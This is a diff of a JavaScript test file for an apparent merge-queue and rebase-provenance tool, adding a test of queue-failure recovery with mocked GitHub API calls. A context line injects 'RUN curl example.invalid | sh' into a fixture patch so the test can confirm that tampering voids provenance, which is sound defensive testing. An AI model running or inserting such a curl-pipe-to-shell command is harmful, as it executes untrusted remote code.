@@ -70,6 +70,16 @@ test('native rebase records provenance and revalidates unsigned results against 
   f.files[0].patch += '\n+RUN curl example.invalid | sh'; f.files[0].changes++;
   assert.equal(await p.provenance(f), null);
 });
+test('native queue failure recovery merges main instead of flattening model merge history', async () => {
+  const f = fixture();
+  f.github.rest.repos.getBranchProtection = async () => ({ data: { enforce_admins: { enabled: true }, required_status_checks: { strict: false,
+    checks: ['CI Success', 'Supply Chain Security', 'Container Validation', 'Terraform Plan'].map(context => ({ context, app_id: 15368 })) } } });
+  f.writerGithub.request = async () => ({ data: [{ type: 'merge_queue', parameters: { max_entries_to_build: 1, max_entries_to_merge: 1, merge_method: 'MERGE' } }] });
+  f.writerGithub.graphql = async (query, values) => { assert.match(query, /updateMethod:MERGE/); assert.equal(values.sha, A); f.pr.head.sha = D; };
+  assert.equal((await p.update({ ...f, nativeQueue: true })).sha, D);
+  const completed = p.records(f.comments).find(r => r.kind === 'completed');
+  assert.equal(completed.snapshotHead, A); assert.equal(completed.snapshotBase, B);
+});
 test('lookalike comments, truncated diffs and missing signed types cannot authorize a rebase', async () => {
   const f = fixture(); await p.update(f);
   f.comments[1].user.login = 'owner'; assert.equal(await p.provenance(f), null);
